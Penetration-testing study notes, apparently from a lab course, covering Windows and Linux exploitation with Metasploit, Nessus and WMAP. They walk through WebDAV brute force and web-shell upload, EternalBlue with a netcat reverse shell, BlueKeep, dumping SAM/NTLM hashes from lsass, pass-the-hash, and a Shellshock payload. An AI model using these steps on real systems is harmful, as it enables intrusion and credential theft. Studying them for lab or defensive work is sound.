# Windows Vulns

- Each Windows version have many vulns associate with.
    - Information disclosure: Access confidential data
    - Buffer overflows 
    - Remote code execute
    - Priviege escalation
    - DOS

## Frequently exploited
- SMB (share files and folder)
- IIS (80, 443) - Web server
- WebDAV (80, 443) - File server for web
- RDP (Remote desktop protocol) ~ 3389
- WinRM (Windows remote management) ~ 5986,443

## Vulns scanning
- `search type:exploit name:<service>` search for exploit for some service
    - Sunglass service
        `set payload windows/meterpreter/reverse_tcp`

- `searchsploit <service>` command - search in exploit db
    - smb has exploit `external blue` on Windows 7/8/sv 2008 R2
- Another db exploit that we can use is [db_autopwn](https://github.com/hahwul/metasploit-autopwn)
    - Download the rb script, move it to /usr/share/metaspl../plugins/
    - On `msfconsole` run `load db_autopwn`
- `analyze` command on `msfconsole - Analyze the host and find vulns

## WebDAV

IIS, web server, provide admin GUI for management. IIS supported exe file extensions:
- asp
- aspx
- config
- php

WebDAV, enable a web server to functions as a file server for collaborative
    - WebDav implements auth in the form of username and password.
    - First step of exploit is identify webDAV has been config to run on IIS server
    - After get the legit credential, we can login and upload a malicious .asp payload
    - Tools: `davtest`, `cadaver`

Exploit steps:
- `nmap -sV -p 80,443 --script=http-enum <target>` - simple check if server have webDAV 
- Brute force auth using `hydra -L <wordlists_user> -P <wordlists_pass> <target> http-get <webDAV URI path>`
- Other way `davtest -url <target>/webdav`
    - `davtest -auth <username:pass> ....` output what file we can upload or execute on the webDAV
- `cadaver <target>` -> Provide user and password -> Interact with shell
    - Use web shell in `/usr/share/webshells/asp/webshell.asp` ~ `put <path>`
    - Lauch the webshell by click on it

## External blue:

**Manual**
- WannaCry using this exploit to spreading ransomware
- Specific tool [Auto Blue](https://github.com/3ndG4me/AutoBlue-MS17-010)
    - Define LHOST and port -> Gen shell code
    - Setup netcat listener `nc -nvlp 1234`
    - `python externalblue_exploit7.py <target> <shellcode_path>/sc_x64.bin
    - Netcat will open remote sessions

**Automation:** We can using msf `exploit/ ... ms17_010_externalblue` -> meterpreter.

## BlueKeep - RDP Vulns

CVE-2019-0708: This vulns target kernel space memory.

- `msf` exploit modules `cve_20..._bluekeep_rce`
    - Use `show targets` for display targets systems -> `set target <number>`
    - Must be set correct target!!
    - If RAM size too high, maybe exploit will fail.
    - Sometimes Windows system will crash during the exploit

### Badblue
- `search badblue`
- use `bablue_passthru` -> Meterpreter
- `pgrep lsass` -> `migrate <id>` -> check with `getuid`
- `load kiwi`
- `lsa_dump_sam` -> Get hash ntlm
- `hash_dump` to get LM hash

### Pass the hash
- We can use the hash as password for modules `exploit/windows/smb/psexec`
  - `set target` change target if needed.

- `crackmapexec smb <target> -u <user> -H <NTLM_hash>` `-H` as HASH

# Linux vulns

- Apache server
- SSH - 22
- FTP - 21/23
- SAMBA 445

## Shellshock 
- CGI script with some specical character in request can make Linux target execute bash script

Exploit by using burpsuite

[Ref](https://github.com/opsxcq/exploit-CVE-2014-6271)

**Steps**:
- `nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target>` - Scan for vuln
- Open burpsuite and intercept the request, change the user-agent to contains `() {:;};`
- We can use module `apache_mod_cgi_bash_env_exec` to exploit

# Nessus

[Nessus Webpage](https://www.tenable.com/products/nessus)

[Lab enviroment](https://github.com/rapid7/metasploitable3)

- Download the free edition
- Change setting and + new scan -> target
- Nessus scan can be import into msf
    - `vulns -p 445` filter vuln for port 445
    - `search cve:<cve_id or year> name:<service>`

# WMAP

WMAP is web vulns scanner. WMAP is fully intergrated with MSF

- Open `msfconsole` -> `load wmap`
- `wmap_sites` Use to add, list and delelte, display site
    - `wmap -a <target>`
- `wmap_targets` add or changing target.
    - `wmap_targets -t <target_url>`
- `wmap_run` `-t` show available modules
    - `-e` Use all availabe modules
- `wmap_vulns -l` list vulns


- module `http_put` put or delete file on server
    - Set URI path Rhosts and run